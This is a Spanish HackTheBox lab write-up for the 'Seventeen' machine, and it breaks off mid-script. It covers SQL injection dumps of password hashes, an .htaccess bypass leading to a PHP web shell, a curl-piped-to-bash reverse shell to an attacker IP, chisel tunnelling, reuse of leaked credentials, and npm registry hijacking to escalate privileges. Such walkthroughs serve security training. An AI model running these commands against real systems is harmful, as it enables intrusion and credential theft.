---
layout: post
title: SevenTeen
date: 2023-06-09
description:
img:
fig-caption:
tags: [eCPPTv2, eWPT, eWPTXv2]
---
___

<center><img src="/writeups/assets/img/Seventeen-htb/Seventeen.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Inyección SQL

* Eliminación .htaccess - Bypass Restricciones

* Reutilización de credenciales

* Remote Port Forwarding

* Abuso de NPM - Instalación de librería customizada (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.165 -oG openports
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-13 14:54 GMT
Nmap scan report for 10.10.11.165
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 17.60 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80,8000 10.10.11.165 -oN portscan
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-13 14:54 GMT
Nmap scan report for 10.10.11.165
Host is up (0.075s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2e:b2:6e:bb:92:7d:5e:6b:36:93:17:1a:82:09:e4:64 (RSA)
|   256 1f:57:c6:53:fc:2d:8b:51:7d:30:42:02:a4:d6:5f:44 (ECDSA)
|_  256 d5:a5:36:38:19:fe:0d:67:79:16:e6:da:17:91:eb:ad (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Let's begin your education with us! 
8000/tcp open  http    Apache httpd 2.4.38
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: Host: 172.17.0.3; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.84 seconds
```

## Puerto 80 (HTTP)

Con ```whatweb``` analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.165/
http://10.10.11.165/ [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.11.165], JQuery, Meta-Author[kavigihan], Modernizr[2.6.2.min], Open-Graph-Protocol, Script, Title[Let's begin your education with us!], X-UA-Compatible[IE=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/Seventeen-htb/1.png" alt="">

Añado el dominio ```seventeen.htb``` al ```/etc/hosts```. Aplico fuerza bruta de subdominios

```null
wfuzz -c --hh=20689 -t 200 -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.seventeen.htb" http://seventeen.htb
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://seventeen.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                        
=====================================================================

000000689:   400        10 L     35 W       301 Ch      "gc._msdcs"                                                                                                                                    
000001013:   200        347 L    991 W      17375 Ch    "exam"                                                                                                                                         

Total time: 18.49206
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 269.7913
```

Añado ```exam.seventeen.htb``` al ```/etc/hosts```. Se ve así:

<img src="/writeups/assets/img/Seventeen-htb/2.png" alt="">

Busco vulnerabilidades para ```Examination Management System```

```null
searchsploit Exam Reviewer Management System
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                                |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Exam Reviewer Management System 1.0 - Remote Code Execution (RCE) (Authenticated)                                                                                             | php/webapps/50726.txt
Exam Reviewer Management System 1.0 - ‘id’ SQL Injection                                                                                                                  | php/webapps/50725.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Examino el segundo

```null
searchsploit -x php/webapps/50725.txt
```

Contiene la dirección URL vulnerable

```null
Vulnerable URL - http://127.0.0.1/erms/?p=take_exam&id=1
```

Utilizo SQLMap para automatizar el proceso. Primo enumero las bases de datos

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --batch --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:11:48 /2023-06-13/

available databases [4]:
[*] db_sfms
[*] erms_db
[*] information_schema
[*] roundcubedb

[15:13:57] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 15:13:57 /2023-06-13/
```

Para ```roundcubedb``` las tablas

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D roundcubedb --tables --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:17:12 /2023-06-13/

[14 tables]
+---------------------+
| session             |
| system              |
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| identities          |
| searches            |
| users               |
+---------------------+
```

Y los datos de todas las columnas de ```users```

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D roundcubedb -T users --dump --threads 10 --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:21:55 /2023-06-13/

Table: users
[1 entry]
+---------+---------------------+------------+-----------+------------+---------------------+-------------------------------------------------------------------+---------------------+----------------------+
| user_id | created             | username   | mail_host | language   | last_login          | preferences                                                       | failed_login        | failed_login_counter |
+---------+---------------------+------------+-----------+------------+---------------------+-------------------------------------------------------------------+---------------------+----------------------+
| 1       | 2022-03-19 21:30:30 | smtpmailer | localhost | en_US      | 2022-03-22 13:41:05 | a:1:{s:11:"client_hash";s:32:"0db936ce29d4c4d2a2f82db8b3d7870c";} | 2022-03-23 15:32:37 | 3                    |
+---------+---------------------+------------+-----------+------------+---------------------+-------------------------------------------------------------------+---------------------+----------------------+
```

Parece ser una sesión activa de la web. Listo ahora las tablas de la base de datos ```erms_db```

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --dbs -D erms_db --tables --threads 10 --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:31:01 /2023-06-13/

[6 tables]
+---------------+
| category_list |
| exam_list     |
| option_list   |
| question_list |
| system_info   |
| users         |
+---------------+

[15:31:38] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 15:31:38 /2023-06-13/
```

Me quedo con todo de ```users```

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' --dbs -D erms_db -T users --dump --threads 10 --batch
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:32:26 /2023-06-13/

[3 entries]
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| id | type | avatar                            | lastname | password                         | username         | firstname    | date_added          | last_login | date_updated        |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
| 1  | 1    | ../oldmanagement/files/avatar.png | Admin    | fc8ec7b43523e186a27f46957818391c | admin            | Adminstrator | 2021-01-20 14:02:37 | NULL       | 2022-02-24 22:00:15 |
| 6  | 2    | ../oldmanagement/files/avatar.png | Anthony  | 48bb86d036bb993dfdcf7fefdc60cc06 | UndetectableMark | Mark         | 2021-09-30 16:34:02 | NULL       | 2022-05-10 08:21:39 |
| 7  | 2    | ../oldmanagement/files/avatar.png | Smith    | 184fe92824bea12486ae9a56050228ee | Stev1992         | Steven       | 2022-02-22 21:05:07 | NULL       | 2022-02-24 22:00:24 |
+----+------+-----------------------------------+----------+----------------------------------+------------------+--------------+---------------------+------------+---------------------+
```

Intento crackear los tres hashes, pero no encuentro ninguna credencial válida

<img src="/writeups/assets/img/Seventeen-htb/3.png" alt="">

Es probable que se esté aplicando ```Virtual Hosting``` y que el directorio al que se está tratando de acceder corresponda a un subdominio. Lo añado al ```/etc/hosts```. Al introducirlo en el navegador me redirige al puerto ```8000``` y un nuevo panel de inicio de sesión

<img src="/writeups/assets/img/Seventeen-htb/4.png" alt="">

Voy a dumpear la base de datos que me faltaba

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D db_sfms --tables --threads 10 --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:48:58 /2023-06-13/

[3 tables]
+---------+
| user    |
| storage |
| student |
+---------+
```

Y los datos para ```user```

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D db_sfms -T user --dump --threads 10 --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:49:37 /2023-06-13/

[3 entries]
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| user_id | status        | lastname      | password                         | username         | firstname     |
+---------+---------------+---------------+----------------------------------+------------------+---------------+
| 1       | administrator | Administrator | fc8ec7b43523e186a27f46957818391c | admin            | Administrator |
| 2       | Regular       | Anthony       | b35e311c80075c4916935cbbbd770cef | UndetectableMark | Mark          |
| 4       | Regular       | Smith         | 112dd9d08abf9dcceec8bc6d3e26b138 | Stev1992         | Steven        |
+---------+---------------+---------------+----------------------------------+------------------+---------------+

[15:51:09] [INFO] table 'db_sfms.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/user.csv'
[15:51:09] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 15:51:09 /2023-06-13/
```

Pero los hashes tampoco los puedo crackear. Al no tener resultados dumpeo también la tabla ```student```

```null
qlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D db_sfms -T student --dump --threads 10 --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:53:04 /2023-06-13/

[4 entries]
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| stud_id | yr | gender | stud_no | lastname | password                                           | firstname |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+
| 1       | 1A | Male   | 12345   | Smith    | 1a40620f9a4ed6cb8d81a1d365559233                   | John      |
| 2       | 2B | Male   | 23347   | Mille    | abb635c915b0cc296e071e8d76e9060c                   | James     |
| 3       | 2C | Female | 31234   | Shane    | a2afa567b1efdb42d8966353337d9024 (autodestruction) | Kelly     |
| 4       | 3C | Female | 43347   | Hales    | a1428092eb55781de5eb4fd5e2ceb835                   | Jamie     |
+---------+----+--------+---------+----------+----------------------------------------------------+-----------+

[15:55:02] [INFO] table 'db_sfms.student' dumped to CSV file '/root/.local/share/sqlmap/output/exam.seventeen.htb/dump/db_sfms/student.csv'
[15:55:02] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/exam.seventeen.htb'

[*] ending @ 15:55:02 /2023-06-13/
```

Para ```Shane``` la contraseña es ```autodestruction``` y el identificador ```31234```. Gano acceso a la interfaz

<img src="/writeups/assets/img/Seventeen-htb/5.png" alt="">

Descargo un PDF que contiene una nota

<img src="/writeups/assets/img/Seventeen-htb/6.png" alt="">

Añado el subdominio ```mastermailer.seventeen.htb``` al ```/etc/hosts```. Corresponde a un ```webmail```

<img src="/writeups/assets/img/Seventeen-htb/7.png" alt="">

También lo podría haber visto desde la tabla ```storage``` en la inyección SQL

```null
sqlmap -u 'http://exam.seventeen.htb/?p=take_exam&id=1' -D db_sfms -T storage --dump --threads 10 --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.7.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:08:16 /2023-06-13/

Table: storage
[1 entry]
+----------+---------+----------------------+-----------------+----------------------+
| store_id | stud_no | filename             | file_type       | date_uploaded        |
+----------+---------+----------------------+-----------------+----------------------+
| 33       | 31234   | Marksheet-finals.pdf | application/pdf | 2020-01-26, 06:57 PM |
+----------+---------+----------------------+-----------------+----------------------+
```

Puedo abrir el PDF sin necesidad de descargarlo con el recurso en PHP si introduzco la ruta donde se encuentra, con formato ```/files``` el identificador de estudiante y nombre de archivo

<img src="/writeups/assets/img/Seventeen-htb/8.png" alt="">

Pero al subir un nuevo archivo no lo interpreta y devuelve un código de estado 403

<img src="/writeups/assets/img/Seventeen-htb/9.png" alt="">

Sobrescribo el ```.htaccess``` para que no valga nada y poder bypassearlo

```null
------WebKitFormBoundaryBm8Ty7AKxbwDIPvW

Content-Disposition: form-data; name="file"; filename=".htaccess"
Content-Type: application/php
```

Puedo ejecutar comandos en el sistema

```null
curl -s -X GET 'http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/pwned.php?cmd=whoami'
www-data
```

Creo un archivo ```index.html``` que se encargue de enviarme una reverse shell

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.4/443 0>&1'
```

Lo comparto con un servicio HTTP con python y lo ejecuto

```null
curl -s -X GET 'http://oldmanagement.seventeen.htb:8000/oldmanagement/files/31234/pwned.php?cmd=curl+10.10.16.4|bash'
```

Gano acceso en una sesión de ```netcat```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.165] 53590
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2e7b388ce9cf:/var/www/html/oldmanagement/files/31234$ script /dev/null -c bash
<oldmanagement/files/31234$ script /dev/null -c bash           
Script started, file is /dev/null
www-data@2e7b388ce9cf:/var/www/html/oldmanagement/files/31234$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

Estoy dentro de un contenedor

```null
www-data@2e7b388ce9cf:/var/www/html/oldmanagement/files/31234$ hostname -I
172.17.0.3
```

Encuentro credenciales de acceso a la base de datos

```null
www-data@2e7b388ce9cf:/var/www/html/employeemanagementsystem/process$ cat dbh.php 
<?php

$servername = "localhost";
$dBUsername = "root";
$dbPassword = "2020bestyearofmylife";
$dBName = "ems";

$conn = mysqli_connect($servername, $dBUsername, $dbPassword, $dBName);

if(!$conn){
	echo "Databese Connection Failed";
}

?>
```

Y también en ```conn.php``` dentro de ```oldmanagement```

```null
www-data@2e7b388ce9cf:/var/www/html/oldmanagement/admin$ cat conn.php 
<?php
	$conn = mysqli_connect("127.0.0.1", "mysqluser", "mysqlpassword", "db_sfms");
	
	if(!$conn){
		die("Error: Failed to connect to database!");
	}
	
	$default_query = mysqli_query($conn, "SELECT * FROM `user`") or die(mysqli_error());
	$check_default = mysqli_num_rows($default_query);
	
	if($check_default === 0){
		$enrypted_password = md5('admin');
		mysqli_query($conn, "INSERT INTO `user` VALUES('', 'Administrator', '', 'admin', '$enrypted_password', 'administrator')") or die(mysqli_error());
		return false;
	}
?>
```

El usuario ```mark``` existe en el contenedor

```null
www-data@2e7b388ce9cf:/$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
mark:x:1000:1000:,,,:/var/www/html:/bin/bash
```

Me conecto a la máquina víctima como ```mark``` y la contraseña ```2020bestyearofmylife```. Puedo ver la primera flag

```null
ssh mark@10.10.11.165
The authenticity of host '10.10.11.165 (10.10.11.165)' can't be established.
ED25519 key fingerprint is SHA256:g48H/Ajb4W/Ct4cyRPBjSfQksMfb0WSo3zZYJlr9jMk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.165' (ED25519) to the list of known hosts.
mark@10.10.11.165's password: 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 4.15.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Jun 13 16:50:03 UTC 2023

  System load:                    0.16
  Usage of /:                     61.8% of 11.75GB
  Memory usage:                   49%
  Swap usage:                     0%
  Processes:                      367
  Users logged in:                0
  IP address for eth0:            10.10.11.165
  IP address for br-3539a4850ffa: 172.20.0.1
  IP address for docker0:         172.17.0.1
  IP address for br-b3834f770aa3: 172.18.0.1
  IP address for br-cc437cf0c6a8: 172.19.0.1


18 updates can be applied immediately.
12 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Tue May 31 18:03:16 2022 from 10.10.14.23
mark@seventeen:~$ cat user.txt 
ea71b0a9f6cf7825099f1574cdd84621
```

El directorio personal de ```mark``` tiene un directorio ```.npm```, pero está vacío

```null
mark@seventeen:~$ ls -la
total 36
drwxr-x--- 5 mark mark 4096 May 11  2022 .
drwxr-xr-x 4 root root 4096 Apr  8  2022 ..
lrwxrwxrwx 1 mark mark    9 Apr 10  2022 .bash_history -> /dev/null
-rw-r--r-- 1 mark mark  220 Apr  8  2022 .bash_logout
-rw-r--r-- 1 mark mark 3771 Apr  8  2022 .bashrc
drwx------ 2 mark mark 4096 Apr  8  2022 .cache
drwx------ 3 mark mark 4096 Apr  8  2022 .gnupg
drwxrwxr-x 2 mark mark 4096 May 31  2022 .npm
-rw-r--r-- 1 mark mark  807 Apr  8  2022 .profile
-rw-r----- 1 root mark   33 Jun 13 14:51 user.txt
```

Hay otro usuario llamado ```kavi``` en ```/home```. Busco por archivos cuyo propietario sea este

```null
mark@seventeen:/$ find \-user kavi 2>/dev/null 
./home/kavi
./var/mail/kavi
```

Puedo leer el correo electrónico

```null
mark@seventeen:/$ cat /var/mail/kavi
To: kavi@seventeen.htb
From: admin@seventeen.htb
Subject: New staff manager application

Hello Kavishka,

Sorry I couldn't reach you sooner. Good job with the design. I loved it. 

I think Mr. Johnson already told you about our new staff management system. Since our old one had some problems, they are hoping maybe we could migrate to a more modern one. For the first phase, he asked us just a simple web UI to store the details of the staff members.

I have already done some server-side for you. Even though, I did come across some problems with our private registry. However as we agreed, I removed our old logger and added loglevel instead. You just have to publish it to our registry and test it with the application. 

Cheers,
Mike
```

Está hablando de un servicio que está en preproducción montando internamente. Veo lo puertos que están abiertos

```null
mark@seventeen:/$ ss -nltp
State                      Recv-Q                      Send-Q                                             Local Address:Port                                              Peer Address:Port                      
LISTEN                     0                           100                                                    127.0.0.1:993                                                    0.0.0.0:*                         
LISTEN                     0                           100                                                    127.0.0.1:995                                                    0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:43749                                                  0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:4873                                                   0.0.0.0:*                         
LISTEN                     0                           80                                                    172.18.0.1:3306                                                   0.0.0.0:*                         
LISTEN                     0                           100                                                    127.0.0.1:110                                                    0.0.0.0:*                         
LISTEN                     0                           100                                                    127.0.0.1:143                                                    0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6000                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                      0.0.0.0:80                                                     0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6001                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:8081                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6002                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6003                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6004                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6005                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                127.0.0.53%lo:53                                                     0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6006                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                      0.0.0.0:22                                                     0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6007                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6008                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                    127.0.0.1:6009                                                   0.0.0.0:*                         
LISTEN                     0                           128                                                         [::]:22                                                        [::]:*                         
```

Subo el ```chisel``` para aplicar ```Remote Port Forwarding```. En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Desde la máquina víctima me conecto como cliente

```null
mark@seventeen:/tmp$ ./chisel client 10.10.16.4:1234 R:socks &>/dev/null & disown
```

Desde ```Firefox``` añado un proxy con el addon ```FoxyProxy``` que opere por SOCKS5. Desde allí cargo el ```127.0.0.1:4873```

<img src="/writeups/assets/img/Seventeen-htb/10.png" alt="">

Me intento registrar, pero devuelve muchos errores

```null
mark@seventeen:/tmp$ npm adduser --registry http://127.0.0.1:4873/
Username: rubbx
Password: 
Email: (this IS public) rubbx@rubbx.com
npm ERR! Linux 4.15.0-177-generic
npm ERR! argv "/usr/bin/node" "/usr/bin/npm" "adduser" "--registry" "http://127.0.0.1:4873/"
npm ERR! node v8.10.0
npm ERR! npm  v3.5.2
npm ERR! code E409

npm ERR! user registration disabled : -/user/org.couchdb.user:rubbx/-rev/undefined
npm ERR! 
npm ERR! If you need help, you may report this error at:
npm ERR!     <https://github.com/npm/npm/issues>

npm ERR! Please include the following file with any support request:
npm ERR!     /tmp/npm-debug.log
```

Enumero los paquetes que están instalados

```null
mark@seventeen:/tmp$ npm search --registry http://127.0.0.1:4873/
npm WARN Building the local index for the first time, please be patient
▐ ╢░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
NAME                 DESCRIPTION                                                  AUTHOR             DATE       VERSION KEYWORDS                                                                                
bignumber.js         A library for arbitrary-precision decimal and non-decimal…   =mikemcl           2022-04-08 9.0.2   arbitrary precision arithmetic big number decimal float biginteger bigdecimal bignumber 
core-util-is         The `util.is*` functions introduced in Node v0.12.           =isaacs            2022-04-08 1.0.3   util isBuffer isArray isNumber isString isRegExp isThis isThat polyfill                 
db-logger            Log data to a database                                       =kavigihan         2022-03-15 1.0.1   log                                                                                     
inherits             Browser-friendly inheritance fully compatible with standard… =isaacs            2022-04-08 2.0.4   inheritance class klass oop object-oriented inherits browser browserify                 
isarray              Array#isArray for older browsers                             =juliangruber      2022-04-08 2.0.5   browser isarray array                                                                   
loglevel             Minimal lightweight logging for JavaScript, adding reliable… =pimterry          2022-05-11 1.8.0   log logger logging browser                                                              
mysql                A node.js driver for mysql. It is written in JavaScript,…    =dougwilson…       2022-04-08 2.18.1                                                                                          
process-nextick-args process.nextTick but always with args                        =cwmma             2022-04-08 2.0.1                                                                                           
readable-stream      Streams3, a user-land copy of the stream library from…       =cwmma =isaacs…    2022-04-08 3.6.0   readable stream pipe                                                                    
safe-buffer          Safer Node.js Buffer API                                     =feross =mafintosh 2022-04-08 5.2.1   buffer buffer allocate node security safe safe-buffer security uninitialized            
sqlstring            Simple SQL escape and format for MySQL                       =sidorares…        2022-04-08 2.3.3   sqlstring sql escape sql escape                                                         
string_decoder       The string_decoder module from Node core                     =cwmma…            2022-04-08 1.3.0   string decoder browser browserify   
```

Instalo el paquete ```db-logger``` en el directorio ```/dev/shm```

```null
mark@seventeen:/dev/shm$ npm install db-logger --registry http://127.0.0.1:4873
/dev/shm
└─┬ db-logger@1.0.1 
  └─┬ mysql@2.18.1 
    ├── bignumber.js@9.0.0 
    ├─┬ readable-stream@2.3.7 
    │ ├── core-util-is@1.0.3 
    │ ├── inherits@2.0.4 
    │ ├── isarray@1.0.0 
    │ ├── process-nextick-args@2.0.1 
    │ ├── string_decoder@1.1.1 
    │ └── util-deprecate@1.0.2 
    ├── safe-buffer@5.1.2 
    └── sqlstring@2.3.1 

npm WARN enoent ENOENT: no such file or directory, open '/dev/shm/package.json'
npm WARN shm No description
npm WARN shm No repository field.
npm WARN shm No README data
npm WARN shm No license field.
```

Dentro de los archivos que ha creado puedo ver el de configuración de la base de datos

```null
mark@seventeen:/dev/shm/node_modules/db-logger$ ls
logger.js  package.json
mark@seventeen:/dev/shm/node_modules/db-logger$ cat logger.js 
var mysql = require('mysql');

var con = mysql.createConnection({
  host: "localhost",
  user: "root",
  password: "IhateMathematics123#",
  database: "logger"
});

function log(msg) {
    con.connect(function(err) {
        if (err) throw err;
        var date = Date();
        var sql = `INSERT INTO logs (time, msg) VALUES (${date}, ${msg});`;
        con.query(sql, function (err, result) {
        if (err) throw err;
        console.log("[+] Logged");
        });
    });
};

module.exports.log = log
```

Se reutiliza para el usuario ```kavi```

```null
mark@seventeen:/dev/shm/node_modules/db-logger$ su kavi
Password: 
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
sh: 0: getcwd() failed: No such file or directory
kavi@seventeen:/dev/shm/node_modules/db-logger$
```

# Escalada

Tengo un privilegio a nivel de sudoers

```null
kavi@seventeen:/dev/shm/node_modules/db-logger$ sudo -l
[sudo] password for kavi: 
Matching Defaults entries for kavi on seventeen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kavi may run the following commands on seventeen:
    (ALL) /opt/app/startup.sh
```

Modifico el archivo de configuración de ```npm``` para que apunte a mi equipo

```null
kavi@seventeen:/dev/shm$ cat ~/.npmrc
registry=http://10.10.16.4:4873/
```

Me quedo en escucha y al ejecutar el ```startup.sh``` recibo la petición

```null
kavi@seventeen:/dev/shm$ sudo /opt/app/startup.sh
[=] Checking for db-logger
[+] db-logger already installed
[=] Checking for loglevel
[+] Installing loglevel
▀ ╢░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟
```

```null
nc -nlvp 4873
listening on [any] 4873 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.11.165] 48778
GET /loglevel HTTP/1.1
accept-encoding: gzip
version: 3.5.2
accept: application/json
referer: install loglevel
npm-session: 46c2c90cb3d14a2d
user-agent: npm/3.5.2 node/v8.10.0 linux x64
host: 10.10.16.4:4873
Connection: keep-alive
```

La idea es crear un paquete ```npm``` malicioso que permita ejecutar comandos como ```root```. En el script se puede ver que se instalan ```db-logger``` y ```loglevel```

```null
#!/bin/bash

cd /opt/app

deps=('db-logger' 'loglevel')

for dep in ${deps[@]}; do
    /bin/echo "[=] Checking for $dep"
